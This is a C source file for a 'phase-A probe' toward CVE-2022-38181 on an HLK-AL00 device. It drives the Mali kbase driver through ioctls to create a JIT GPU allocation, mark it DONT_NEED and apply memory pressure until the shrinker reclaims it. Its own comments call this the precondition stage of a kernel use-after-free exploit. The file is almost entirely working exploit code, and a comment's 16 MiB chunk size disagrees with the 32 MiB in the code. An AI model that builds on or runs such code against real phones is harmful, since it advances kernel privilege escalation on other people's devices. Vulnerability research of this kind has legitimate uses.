/* HLK-AL00 CVE-2022-38181 phase-A probe: can a DONT_NEED JIT allocation
 * actually be reclaimed by the kbase shrinker under anonymous memory pressure?
 *
 * Steps (each logged + fsync to /data/local/tmp/jit_evict.log):
 *   1. open /dev/mali0, VERSION_CHECK 11.16, SET_FLAGS, tracking mmap
 *   2. MEM_JIT_INIT(va=0x1000, max_alloc=255, trim=100, group=0)
 *   3. MEM_ALLOC 1 page as the JIT-VA landing buffer, mmap RW
 *   4. JIT_ALLOC softjob (25 pages) -> read JIT VA
 *   5. MEM_QUERY(COMMIT_SIZE) == 25
 *   6. MEM_FLAGS_CHANGE(jit_va, DONT_NEED)
 *   7. anonymous 16 MiB chunks, memset each; after each chunk query the JIT
 *      region. The kbase shrinker should evict the DONT_NEED pages and the
 *      destroy worker frees the region, making MEM_QUERY fail (-EINVAL).
 *
 * No alias, no page-table games: this is the precondition only.
 *
 * Build:
 *   tools/zig-windows-x86_64-0.11.0/zig.exe cc -target aarch64-linux-musl \
 *     -static -O2 -o probe/jit_evict_probe probe/jit_evict_probe.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <poll.h>

#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_version_check { uint16_t major, minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
union kbase_ioctl_mem_alloc {
	struct { uint64_t va_pages, commit_pages, extent, flags; } in;
	struct { uint64_t flags, gpu_va; } out;
};
union kbase_ioctl_mem_query {
	struct { uint64_t gpu_addr; uint64_t query; } in;
	struct { uint64_t value; } out;
};
struct kbase_ioctl_mem_flags_change { uint64_t gpu_va, flags, mask; };
struct kbase_ioctl_mem_jit_init {
	uint64_t va_pages;
	uint8_t max_allocations, trim_level, group_id, padding[5];
};

struct base_jd_udata { uint64_t blob[2]; };
struct base_dependency { uint8_t atom_id, dependency_type; };
struct base_jd_atom_v2 {
	uint64_t jc;
	struct base_jd_udata udata;
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	struct base_dependency pre_dep[2];
	uint8_t atom_number, prio, device_nr, padding[1];
	uint32_t core_req;
};
_Static_assert(sizeof(struct base_jd_atom_v2) == 48, "atom must be 48");

struct base_jd_event_v2 {
	uint32_t event_code;
	uint8_t atom_number, padding[3];
	struct base_jd_udata udata;
};

/* base_jit_alloc_info layout used by the HM2 JIT softjob */
struct base_jit_alloc_info {
	uint64_t gpu_alloc_addr;
	uint64_t va_pages;
	uint64_t commit_pages;
	uint64_t extent;
	uint8_t id;
	uint8_t bin_id;
	uint8_t max_allocations;
	uint8_t flags;
	uint8_t padding[2];
	uint16_t usage_id;
};

#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_JOB_SUBMIT _IOW(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_job_submit)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_QUERY _IOWR(KBASE_IOCTL_TYPE, 6, union kbase_ioctl_mem_query)
#define KBASE_IOCTL_MEM_JIT_INIT _IOW(KBASE_IOCTL_TYPE, 14, struct kbase_ioctl_mem_jit_init)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_PROT_CPU_RD (1ull << 0)
#define BASE_MEM_PROT_CPU_WR (1ull << 1)
#define BASE_MEM_PROT_GPU_RD (1ull << 2)
#define BASE_MEM_PROT_GPU_WR (1ull << 3)
#define BASE_MEM_DONT_NEED (1ull << 17)
#define BASE_JD_REQ_SOFT_JIT_ALLOC 0x209u
#define KBASE_MEM_QUERY_COMMIT_SIZE 1ull

#define PAGE 4096ull
#define SPRAY_PAGES 25ull
#define CHUNK (32ull << 20)   /* 32 MiB anonymous per pressure step */
#define MAX_CHUNKS 160        /* up to 5 GiB */
#define LOGFILE "/data/local/tmp/jit_evict.log"

static void mark(const char *fmt, ...)
{
	char buf[512];
	va_list ap;
	int n, fd;

	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof(buf) - 2, fmt, ap);
	va_end(ap);
	if (n < 0)
		n = 0;
	if (n > (int)sizeof(buf) - 2)
		n = sizeof(buf) - 2;
	buf[n++] = '\n';
	buf[n] = 0;

	write(1, buf, n);
	fd = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
	if (fd >= 0) {
		write(fd, buf, n);
		fsync(fd);
		close(fd);
	}
}

static int wait_event(int fd, struct base_jd_event_v2 *ev, int ms)
{
	struct pollfd pfd = { .fd = fd, .events = POLLIN };
	int r = poll(&pfd, 1, ms);
	if (r <= 0)
		return -1;
	return read(fd, ev, sizeof(*ev)) == (int)sizeof(*ev) ? 0 : -1;
}

static uint64_t query_commit(int fd, uint64_t va, int *err)
{
	union kbase_ioctl_mem_query q;

	memset(&q, 0, sizeof(q));
	q.in.gpu_addr = va;
	q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
	errno = 0;
	*err = ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q);
	if (*err)
		return (uint64_t)-1;
	return q.out.value;
}

int main(void)
{
	struct kbase_ioctl_version_check vc;
	struct kbase_ioctl_set_flags sf;
	struct kbase_ioctl_mem_jit_init ji;
	union kbase_ioctl_mem_alloc a;
	struct kbase_ioctl_mem_flags_change fc;
	struct base_jit_alloc_info info;
	struct base_jd_atom_v2 atom;
	struct base_jd_event_v2 ev;
	void *tracking, *landing;
	uint64_t jit_va;
	int fd, err, ret;
	uint64_t total = 0;
	int evicted_at = -1;

	mark("=== jit_evict phase A ===");

	fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		mark("open: %s", strerror(errno));
		return 1;
	}
	memset(&vc, 0, sizeof(vc));
	vc.major = 11; vc.minor = 16;
	ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	mark("version %u.%u", vc.major, vc.minor);

	memset(&sf, 0, sizeof(sf));
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) != 0) {
		mark("SET_FLAGS: %s", strerror(errno));
		return 1;
	}
	tracking = mmap(NULL, PAGE, 0, MAP_SHARED, fd,
			(off_t)BASE_MEM_MAP_TRACKING_HANDLE);
	if (tracking == MAP_FAILED) {
		mark("tracking mmap: %s", strerror(errno));
		return 1;
	}
	mark("tracking at %p", tracking);

	memset(&ji, 0, sizeof(ji));
	ji.va_pages = 0x1000;
	ji.max_allocations = 255;
	ji.trim_level = 100;
	ji.group_id = 0;
	errno = 0;
	ret = ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &ji);
	mark("JIT_INIT ret=%d errno=%d (%s)", ret, errno, strerror(errno));
	if (ret)
		return 1;

	memset(&a, 0, sizeof(a));
	a.in.va_pages = 1;
	a.in.commit_pages = 1;
	a.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	errno = 0;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) != 0) {
		mark("landing MEM_ALLOC: %s", strerror(errno));
		return 1;
	}
	landing = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		       (off_t)a.out.gpu_va);
	if (landing == MAP_FAILED) {
		mark("landing mmap: %s", strerror(errno));
		return 1;
	}
	*(volatile uint64_t *)landing = 0;
	mark("landing page at %p (cookie 0x%llx)", landing,
	     (unsigned long long)a.out.gpu_va);

	memset(&info, 0, sizeof(info));
	info.gpu_alloc_addr = (uint64_t)(uintptr_t)landing;
	info.va_pages = SPRAY_PAGES;
	info.commit_pages = SPRAY_PAGES;
	info.extent = 1;
	info.id = 1;
	info.bin_id = 0;
	info.max_allocations = 255;
	info.usage_id = 0;

	memset(&atom, 0, sizeof(atom));
	atom.jc = (uint64_t)(uintptr_t)&info;
	atom.nr_extres = 1;
	atom.atom_number = 1;
	atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;

	{
		struct kbase_ioctl_job_submit js;
		memset(&js, 0, sizeof(js));
		js.addr = (uint64_t)(uintptr_t)&atom;
		js.nr_atoms = 1;
		js.stride = sizeof(atom);
		errno = 0;
		ret = ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js);
		mark("JIT_ALLOC submit ret=%d errno=%d (%s)", ret, errno,
		     strerror(errno));
		if (ret)
			return 1;
	}
	if (wait_event(fd, &ev, 2000) == 0)
		mark("JIT_ALLOC event code=0x%x atom=%u", ev.event_code,
		     ev.atom_number);
	else
		mark("JIT_ALLOC event timeout");

	jit_va = *(volatile uint64_t *)landing;
	mark("jit_va = 0x%llx", (unsigned long long)jit_va);
	if (!jit_va)
		return 1;

	{
		uint64_t v = query_commit(fd, jit_va, &err);
		mark("query before: ret=%d errno=%d value=%llu", err, errno,
		     (unsigned long long)v);
	}

	memset(&fc, 0, sizeof(fc));
	fc.gpu_va = jit_va;
	fc.flags = BASE_MEM_DONT_NEED;
	fc.mask = BASE_MEM_DONT_NEED;
	errno = 0;
	ret = ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc);
	mark("FLAGS_CHANGE(DONT_NEED) ret=%d errno=%d (%s)", ret, errno,
	     strerror(errno));

	for (int i = 0; i < MAX_CHUNKS; i++) {
		void *p = mmap(NULL, CHUNK, PROT_READ | PROT_WRITE,
			       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (p == MAP_FAILED) {
			mark("chunk %d mmap failed: %s", i, strerror(errno));
			break;
		}
		memset(p, 0x5a, CHUNK);
		total += CHUNK;

		{
			uint64_t v = query_commit(fd, jit_va, &err);
			if (err) {
				mark("chunk %d: pressure=%llu MiB QUERY FAILED errno=%d (%s) -> reclaimed",
				     i, (unsigned long long)(total >> 20), errno,
				     strerror(errno));
				evicted_at = i;
				break;
			}
			if ((i & 7) == 7 || i == 0)
				mark("chunk %d: pressure=%llu MiB commit=%llu",
				     i, (unsigned long long)(total >> 20),
				     (unsigned long long)v);
			if (v != SPRAY_PAGES) {
				mark("chunk %d: commit changed to %llu -> reclaimed",
				     i, (unsigned long long)v);
				evicted_at = i;
				break;
			}
		}
	}

	mark("phase A result: evicted_at=%d pressure=%llu MiB",
	     evicted_at, (unsigned long long)(total >> 20));
	close(fd);
	return evicted_at >= 0 ? 0 : 2;
}
